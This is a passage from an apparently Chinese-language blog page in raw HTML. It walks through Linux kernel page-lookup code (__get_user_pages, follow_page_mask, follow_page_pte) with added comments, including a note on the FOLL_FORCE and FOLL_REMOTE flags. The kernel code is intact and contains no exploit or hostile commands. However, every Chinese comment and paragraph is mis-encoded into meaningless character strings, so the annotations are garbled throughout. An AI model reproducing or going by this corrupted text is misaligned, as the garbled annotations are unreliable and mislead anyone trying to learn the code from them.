ÈÅçÂéÜÊâÄÊúâÈúÄË¶ÅÈîÅÂÆöÁöÑÈ°µ, Â§ÑÁêÜ‰∏Ä‰∏™È°µ‰πãÂâç, ÂÖàÊâæÂà∞ÊâÄÂ±ûÁöÑVMA</span><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> foll_flags = gup_flags;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_increm;<br>		<br>        <span class="hljs-comment">//Â¶ÇÊûúÊòØÁ¨¨‰∏ÄÊ¨°Ëø≠‰ª£ÔºåÊàñËÄÖË∑®Ë∂ä‰∫ÜVMAÁöÑËæπÁïå</span><br>		<span class="hljs-comment">/* first iteration or cross vma bound */</span><br>		<span class="hljs-keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;<br>			vma = find_extend_vma(mm, start);<span class="hljs-comment">//ÂØªÊâæÂåÖÂê´startÁöÑVMAÂØπË±°</span><br>			<span class="hljs-keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;<span class="hljs-comment">//ÂØªÊâæÂá∫Èîô</span><br>				<span class="hljs-type">int</span> ret;<br>				ret = get_gate_page(mm, start &amp; PAGE_MASK,<br>						gup_flags, &amp;vma,<br>						pages ? &amp;pages[i] : <span class="hljs-literal">NULL</span>);<br>				<span class="hljs-keyword">if</span> (ret)<br>					<span class="hljs-keyword">return</span> i ? : ret;<br>				page_mask = <span class="hljs-number">0</span>;<br>				<span class="hljs-keyword">goto</span> next_page;<br>			&#125;<br>			<span class="hljs-comment">//Áü≠Ë∑ØÊµãËØïÔºöÂ¶ÇÊûúvma‰∏ç‰∏∫NULLÔºåÈÇ£Â∞±‰ºöÊâßË°åcheck_vma_flags(vma, gup_flags)Ê£ÄÊü•‰∏ãvmaÁöÑÊùÉÈôêÊòØÊª°Ë∂≥gup_flagsÁöÑË¶ÅÊ±Ç</span><br>			<span class="hljs-keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))<br>				<span class="hljs-keyword">return</span> i ? : -EFAULT;<br>			<span class="hljs-keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;<span class="hljs-comment">//ÂØπ‰∫éÂ§ßTLBÁöÑÈ°µÈù¢ÔºåË∞ÉÁî®follow_hugetlb_page()Â§ÑÁêÜ</span><br>				i = follow_hugetlb_page(mm, vma, pages, vmas,<br>						&amp;start, &amp;nr_pages, i,<br>						gup_flags);<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br>		&#125;<br>retry:<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment">		 * potentially allocating memory.</span><br><span class="hljs-comment">		 */</span><br>        <span class="hljs-comment">/*__get_user_pages()ÊúÄÊ†∏ÂøÉÁöÑÈÉ®ÂàÜ, Â∞±ÊòØ‰∏ãÈù¢Ëøô‰∏™Âæ™ÁéØ, follow_page_mask()Âà§Êñ≠ÂØπÂ∫îÈ°µÊòØÂê¶Êª°Ë∂≥foll_flagsË¶ÅÊ±Ç, faultin_page()Ë¥üË¥£Â§ÑÁêÜÈîôËØØ, ‰ºö‰∏ÄÁõ¥Âæ™ÁéØÂà∞ÂØπÂ∫îÈ°µÊª°Ë∂≥foll_flagsÁöÑË¶ÅÊ±Ç*/</span><br>        <span class="hljs-comment">//Â¶ÇÊûúÊúâÂæÖÂ§ÑÁêÜÁöÑSIGKILLÔºåÂ∞±Áõ¥Êé•ÁªìÊùü</span><br>		<span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br>			<span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>		cond_resched();<span class="hljs-comment">//Ë∞ÉÂ∫¶ÊâßË°åÂà´ÁöÑ‰ªªÂä°</span><br>        <span class="hljs-comment">//Ê†πÊçÆfoll_flagsÁöÑË¶ÅÊ±ÇËøΩË∏™vma‰∏≠startÂØπÂ∫îÁöÑÈ°µÔºåÂ¶ÇÊûú‰∏çËÉΩÊª°Ë∂≥Ë¶ÅÊ±ÇÊàñËÄÖÈ°µ‰∏çÂ≠òÂú®ÔºåÂ∞±ËøîÂõûNULL</span><br>		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br>		<span class="hljs-keyword">if</span> (!page) &#123;<span class="hljs-comment">//Áº∫È°µÂºÇÂ∏∏Â§ÑÁêÜ</span><br>			<span class="hljs-type">int</span> ret;<br>            <span class="hljs-comment">//faultin_page()‰ºöÂ§ÑÁêÜÁº∫È°µÂºÇÂ∏∏ÔºåÂ§ÑÁêÜÂÆåÊØïÂêé‰ºöËøîÂõû0</span><br>			ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br>					nonblocking);<br>			<span class="hljs-keyword">switch</span> (ret) &#123;<br>			<span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>				<span class="hljs-keyword">goto</span> retry;<span class="hljs-comment">//Áº∫È°µÂºÇÂ∏∏Â§ÑÁêÜÂÆåÊØïÔºåÂÜçÊ¨°Â∞ùËØïËøΩË∏™È°µÔºåÁúãÊúâÊó†Áº∫È°µÂºÇÂ∏∏ÂèëÁîü</span><br>			<span class="hljs-keyword">case</span> -EFAULT:<span class="hljs-comment">//Â§ÑÁêÜÁº∫È°µÂºÇÂ∏∏Êó∂ÂèëÈÄÅÔºåÂ§ÑÁêÜÁªàÊ≠¢</span><br>			<span class="hljs-keyword">case</span> -ENOMEM:<br>			<span class="hljs-keyword">case</span> -EHWPOISON:<br>				<span class="hljs-keyword">return</span> i ? i : ret;<br>			<span class="hljs-keyword">case</span> -EBUSY:<br>				<span class="hljs-keyword">return</span> i;<br>			<span class="hljs-keyword">case</span> -ENOENT:<span class="hljs-comment">//ÂºÇÂ∏∏Â§ÑÁêÜÂÆåÊØïÔºåÂè™ÊòØÊ≤°ÊúâÂØπÂ∫îÁöÑÈ°µÊèèËø∞Á¨¶ÔºåÂ§ÑÁêÜ‰∏ã‰∏ÄÈ°µ</span><br>				<span class="hljs-keyword">goto</span> next_page;<br>			&#125;<br>			BUG();<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Proper page table entry exists, but no corresponding</span><br><span class="hljs-comment">			 * struct page.</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-keyword">goto</span> next_page;<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (IS_ERR(page)) &#123;<br>			<span class="hljs-keyword">return</span> i ? i : PTR_ERR(page);<br>		&#125;<br>        <span class="hljs-comment">//Â§ÑÁêÜÂÆåËøô‰∏™È°µ‰πãÂêé, ËÆ∞ÂΩïÁªìÊûú, ÁÑ∂ÂêéÂ§ÑÁêÜ‰∏ã‰∏Ä‰∏™È°µ</span><br>		<span class="hljs-keyword">if</span> (pages) &#123;<span class="hljs-comment">//ËÆ∞ÂΩïÈîÅÂÆöÁöÑÈ°µ</span><br>			pages[i] = page;<br>			flush_anon_page(vma, page, start);<br>			flush_dcache_page(page);<br>			page_mask = <span class="hljs-number">0</span>;<br>		&#125;<br>next_page:<br>		<span class="hljs-keyword">if</span> (vmas) &#123;<span class="hljs-comment">//ËÆ∞ÂΩïÈ°µÂØπÂ∫îÁöÑvma</span><br>			vmas[i] = vma;<br>			page_mask = <span class="hljs-number">0</span>;<br>		&#125;<br>		page_increm = <span class="hljs-number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);<br>		<span class="hljs-keyword">if</span> (page_increm &gt; nr_pages)<br>			page_increm = nr_pages;<br>		i += page_increm;<span class="hljs-comment">//Â§ÑÁêÜ‰∫ÜÂ§öÂ∞ëÈ°µ</span><br>		start += page_increm * PAGE_SIZE;<span class="hljs-comment">//‰∏ã‰∏Ä‰∏™Â§ÑÁêÜÁöÑÂú∞ÂùÄ</span><br>		nr_pages -= page_increm;<span class="hljs-comment">//ËøòÂâ©Â§öÂ∞ëÈ°µ</span><br>	&#125; <span class="hljs-keyword">while</span> (nr_pages);<br>	<span class="hljs-keyword">return</span> i;<br>&#125;<br>EXPORT_SYMBOL(__get_user_pages);<br></code></pre></td></tr></table></figure>

<h4 id="follow-page-mask"><a href="#follow-page-mask" class="headerlink" title="follow_page_mask()"></a>follow_page_mask()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * follow_page_mask - look up a page descriptor from a user-virtual address</span><br><span class="hljs-comment"> * @vma: vm_area_struct mapping @address</span><br><span class="hljs-comment"> * @address: virtual address to look up</span><br><span class="hljs-comment"> * @flags: flags modifying lookup behaviour</span><br><span class="hljs-comment"> * @page_mask: on output, *page_mask is set according to the size of the page</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags can have FOLL_ flags set, defined in &lt;linux/mm.h&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns the mapped (struct page *), %NULL if no mapping exists, or</span><br><span class="hljs-comment"> * an error pointer if there is a mapping to something not represented</span><br><span class="hljs-comment"> * by a page descriptor (see also vm_normal_page()).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  follow_page_mask -Ê†πÊçÆ‰∏Ä‰∏™Áî®Êà∑Á©∫Èó¥Âú∞ÂùÄÊâæ‰∏Ä‰∏™È°µÊèèËø∞Á¨¶</span><br><span class="hljs-comment">  @vmaÔºöÊò†Â∞Ñ@addressÁöÑVMAÂØπË±°</span><br><span class="hljs-comment">  @flagsÔºöÊéßÂà∂Êü•ÊâæË°å‰∏∫ÁöÑÊèèËø∞Á¨¶</span><br><span class="hljs-comment">  @page_maskÔºö*page_maskÊ†πÊçÆÈ°µÈù¢Â§ßÂ∞èËÆæÁΩÆ</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">  ËøîÂõûË¢´Êò†Â∞ÑÁöÑÈ°µÔºåÂ¶ÇÊûúÈ°µ‰∏çÂ≠òÂú®ÊàñËÄÖÂá∫ÈîôÁöÑËØùÂ∞±ËøîÂõûNULL</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">			      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">			      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>&#123;<br>	<span class="hljs-type">pgd_t</span> *pgd;<span class="hljs-comment">//ÂÖ®Â±ÄÈ°µÁõÆÂΩï</span><br>	<span class="hljs-type">pud_t</span> *pud;<span class="hljs-comment">//È°µ‰∏äÁ∫ßÁõÆÂΩï</span><br>	<span class="hljs-type">pmd_t</span> *pmd;<span class="hljs-comment">//È°µ‰∏≠Á∫ßÁõÆÂΩï</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;<span class="hljs-comment">//Ëá™ÊóãÈîÅ</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<span class="hljs-comment">//VMAÊâÄÂ±ûÁöÑÂÜÖÂ≠òÁ©∫Èó¥</span><br><br>	*page_mask = <span class="hljs-number">0</span>;<span class="hljs-comment">//Ê†πÊçÆÈ°µÈù¢Â§ßÂ∞èËÆæÁΩÆÁöÑÊé©Á†Å</span><br><br>	page = follow_huge_addr(mm, address, flags &amp; FOLL_WRITE);<br>	<span class="hljs-keyword">if</span> (!IS_ERR(page)) &#123;<br>		BUG_ON(flags &amp; FOLL_GET);<br>		<span class="hljs-keyword">return</span> page;<br>	&#125;<br>    <span class="hljs-comment">/*	</span><br><span class="hljs-comment">    	Ë∑üË∏™ÂõõÁ∫ßÈ°µÁõÆÂΩï:pgd=&gt;pud=&gt;pmd,</span><br><span class="hljs-comment">    	Â¶ÇÊûúÂØπÂ∫îË°®È°π‰∏∫none, ÂàôËøîÂõûno_page_table()Ë°®Á§∫Âá∫Èîô, ÊúÄÂêéËøõÂÖ•follow_page_pte()Ë∑üË∏™pte</span><br><span class="hljs-comment">    */</span><br>	<span class="hljs-comment">//Âú®mm‰∏≠Ê†πÊçÆaddressÊâæÂØπÂ∫îÁöÑÈ°µÂÖ®Â±ÄÁõÆÂΩï</span><br>	pgd = pgd_offset(mm, address);<br>	<span class="hljs-keyword">if</span> (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>    <br>	<span class="hljs-comment">//Âú®È°µÂÖ®Â±ÄÁõÆÂΩï‰∏≠ÊâæÂØπÂ∫îÁöÑÈ°µ‰∏äÁ∫ßÁõÆÂΩï</span><br>	pud = pud_offset(pgd, address);<br>	<span class="hljs-keyword">if</span> (pud_none(*pud))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pud_huge(*pud) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>		page = follow_huge_pud(mm, address, pud, flags);<br>		<span class="hljs-keyword">if</span> (page)<br>			<span class="hljs-keyword">return</span> page;<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (unlikely(pud_bad(*pud)))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-comment">//Âú®È°µ‰∏äÁ∫ßÁõÆÂΩï‰∏≠ÊâæÂØπÂ∫îÁöÑÈ°µ‰∏≠Á∫ßÁõÆÂΩï</span><br>	pmd = pmd_offset(pud, address);<br>	<span class="hljs-keyword">if</span> (pmd_none(*pmd))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pmd_huge(*pmd) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>		page = follow_huge_pmd(mm, address, pmd, flags);<br>		<span class="hljs-keyword">if</span> (page)<br>			<span class="hljs-keyword">return</span> page;<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pmd_protnone(*pmd))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pmd_devmap(*pmd)) &#123;<br>		ptl = pmd_lock(mm, pmd);<br>		page = follow_devmap_pmd(vma, address, pmd, flags);<br>		spin_unlock(ptl);<br>		<span class="hljs-keyword">if</span> (page)<br>			<span class="hljs-keyword">return</span> page;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (likely(!pmd_trans_huge(*pmd)))<span class="hljs-comment">//Ë∑üË∏™pte</span><br>		<span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br><br>	ptl = pmd_lock(mm, pmd);<br>	<span class="hljs-keyword">if</span> (unlikely(!pmd_trans_huge(*pmd))) &#123;<br>		spin_unlock(ptl);<br>		<span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT) &#123;<br>		<span class="hljs-type">int</span> ret;<br>		page = pmd_page(*pmd);<br>		<span class="hljs-keyword">if</span> (is_huge_zero_page(page)) &#123;<br>			spin_unlock(ptl);<br>			ret = <span class="hljs-number">0</span>;<br>			split_huge_pmd(vma, pmd, address);<br>			<span class="hljs-keyword">if</span> (pmd_trans_unstable(pmd))<br>				ret = -EBUSY;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			get_page(page);<br>			spin_unlock(ptl);<br>			lock_page(page);<br>			ret = split_huge_page(page);<br>			unlock_page(page);<br>			put_page(page);<br>			<span class="hljs-keyword">if</span> (pmd_none(*pmd))<br>				<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>		&#125;<br><br>		<span class="hljs-keyword">return</span> ret ? ERR_PTR(ret) :<br>			follow_page_pte(vma, address, pmd, flags);<br>	&#125;<br><br>	page = follow_trans_huge_pmd(vma, address, pmd, flags);<br>	spin_unlock(ptl);<br>	*page_mask = HPAGE_PMD_NR - <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte()"></a>follow_page_pte()</h4><p>ÂØπ‰∫éÂ§ßÂ§öÊï∞ÊôÆÈÄöÈ°µÊù•ËØ¥<code>follow_page_pte()</code>‰ºöÊ£ÄÊü•È°µ‰∏çÂ≠òÂú®ÂíåÈ°µ‰∏çÂèØÂÜôÂÖ•‰∏§ÁßçÁº∫È°µÂºÇÂ∏∏, ÁÑ∂ÂêéË∞ÉÁî®<code>vm_normal_page()</code>Ê†πÊçÆ<code>pte</code>ÊâæÂà∞ÂØπÂ∫îÁöÑÈ°µÊèèËø∞Á¨¶<code>page</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//Ê†πÊçÆflagsÊ†áÂøóË∑üË∏™È°µÈù¢ÁöÑpte</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dev_pagemap</span> *<span class="hljs-title">pgmap</span> =</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;<br>	<span class="hljs-type">pte_t</span> *ptep, pte;<br><br>retry:<br>	<span class="hljs-keyword">if</span> (unlikely(pmd_bad(*pmd)))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><br>	ptep = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br>	pte = *ptep;<br>	<span class="hljs-keyword">if</span> (!pte_present(pte)) &#123;<br>		<span class="hljs-type">swp_entry_t</span> entry;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * KSM&#x27;s break_ksm() relies upon recognizing a ksm page</span><br><span class="hljs-comment">		 * even while it is being migrated, so for that case we</span><br><span class="hljs-comment">		 * need migration_entry_wait().</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (likely(!(flags &amp; FOLL_MIGRATION)))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		<span class="hljs-keyword">if</span> (pte_none(pte))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		entry = pte_to_swp_entry(pte);<br>		<span class="hljs-keyword">if</span> (!is_migration_entry(entry))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		pte_unmap_unlock(ptep, ptl);<br>		migration_entry_wait(mm, pmd, address);<br>		<span class="hljs-keyword">goto</span> retry;<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))<br>		<span class="hljs-keyword">goto</span> no_page;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//Â¶ÇÊûúË¶ÅÊ±ÇÂÜôÂÖ•Ôºå‰ΩÜÊòØpteË°®Á§∫‰∏çÂèØÂÜôÂÖ•</span><br>		pte_unmap_unlock(ptep, ptl);<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>	page = vm_normal_page(vma, address, pte);<span class="hljs-comment">//Ê†πÊçÆËøô‰∏™pteÊâæÂà∞ÂØπÂ∫îÁöÑÊôÆÈÄöÈ°µÊèèËø∞Á¨¶</span><br>    <span class="hljs-comment">/*	</span><br><span class="hljs-comment">    	ÊâæÂà∞È°µÊèèËø∞Á¨¶Âêé, ‰ºöÊ†πÊçÆflagsËøõË°å‰∏Ä‰∫õÊìç‰Ωú, ÁÑ∂ÂêéËøîÂõûpage, Âú®ËøôÈáåflags = 0x2017, ‰πüÂ∞±ÊòØÂ¶Ç‰∏ãÊ†áÂøó</span><br><span class="hljs-comment">		FOLL_WRITE 0x01 : ÈúÄË¶ÅËøõË°åÂÜôÂÖ•</span><br><span class="hljs-comment">		FOLL_TOUCH 0x02 : Ê†áËÆ∞‰∏Ä‰∏ãÈ°µÈù¢Ë¢´ËÆøÈóÆËøá</span><br><span class="hljs-comment">		FOLL_GET 0x04 : Ëé∑ÂèñÈ°µÈù¢ÁöÑÂºïÁî®, ‰ªéËÄåËÆ©È°µÈù¢ÈîÅÂÆöÂú®ÂÜÖÂ≠ò‰∏≠</span><br><span class="hljs-comment">		FOLL_FORCE 0x10 : Âº∫Âà∂ÂÜôÂÖ•Âè™ËØªÂÜÖÂ≠òÂå∫</span><br><span class="hljs-comment">		FOLL_REMOTE 0x2000 : Ë¶ÅËÆøÈóÆÁöÑ‰∏çÊòØÂΩìÂâç‰ªªÂä°ÁöÑÂÜÖÂ≠òÁ©∫Èó¥</span><br><span class="hljs-comment"> 	*/</span><br>	<span class="hljs-keyword">if</span> (!page &amp;&amp; pte_devmap(pte) &amp;&amp; (flags &amp; FOLL_GET)) &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Only return device mapping pages in the FOLL_GET case since</span><br><span class="hljs-comment">		 * they are only valid while holding the pgmap reference.</span><br><span class="hljs-comment">		 */</span><br>		pgmap = get_dev_pagemap(pte_pfn(pte), <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">if</span> (pgmap)<br>			page = pte_page(pte);<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">goto</span> no_page;<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>		<span class="hljs-keyword">if</span> (flags &amp; FOLL_DUMP) &#123;<br>			<span class="hljs-comment">/* Avoid special (like zero) pages in core dumps */</span><br>			page = ERR_PTR(-EFAULT);<br>			<span class="hljs-keyword">goto</span> out;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (is_zero_pfn(pte_pfn(pte))) &#123;<br>			page = pte_page(pte);<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-type">int</span> ret;<br><br>			ret = follow_pfn_pte(vma, address, ptep, flags);<br>			page = ERR_PTR(ret);<br>			<span class="hljs-keyword">goto</span> out;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT &amp;&amp; PageTransCompound(page)) &#123;<br>		<span class="hljs-type">int</span> ret;<br>		get_page(page);<br>		pte_unmap_unlock(ptep, ptl);<br>		lock_page(page);<br>		ret = split_huge_page(page);<br>		unlock_page(page);<br>		put_page(page);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">return</span> ERR_PTR(ret);<br>		<span class="hljs-keyword">goto</span> retry;<br>	&#125;<br><br>	